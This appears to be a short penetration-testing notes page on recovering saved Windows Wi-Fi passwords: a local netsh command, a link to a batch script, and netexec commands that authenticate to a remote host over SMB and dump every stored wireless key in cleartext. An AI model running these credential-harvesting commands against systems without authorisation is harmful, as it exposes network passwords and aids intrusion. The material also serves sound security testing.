# Get Wireless password from Windows CMD



```
Netsh wlan show profile name="Wi-F name" key=clear
```

For convenience, here is a batch script that will display all the saved passwords.

{% file src="../../.gitbook/assets/display-all-saved-wireless-passwords.bat" %}

Additionally, you can use netexec in order to automate showing all profiles remotely

{% code overflow="wrap" %}
```bash
netexec smb 10.123.4.21 -u tester1 -p tester1 -x "powershell -Command \"\$profiles = (netsh wlan show profiles) -match 'All User Profile' | ForEach-Object { if (\$_ -match ': (.*)\s*\$') { \$matches[1].Trim() }}; \$results = @(); foreach (\$profile in \$profiles) { if (\$profile) { \$keyContent = (netsh wlan show profile name=\\\"\$profile\\\" key=clear | Select-String -Pattern 'Key Content' | ForEach-Object { if (\$_ -match 'Key Content\s*:\s*(.*)') { \$matches[1] } }); if (\$keyContent -and \$keyContent -ne \$null) { \$results += [PSCustomObject]@{ ProfileName = \$profile; Password = \$keyContent.Trim() } } }}; \$results | Format-Table -AutoSize\""
```
{% endcode %}

Actually, turns out you can do this with the wifi module in Netexec

{% code overflow="wrap" %}
```bash
netexec smb 10.123.4.21 -u tester1 -p tester1 -M wifi
```
{% endcode %}
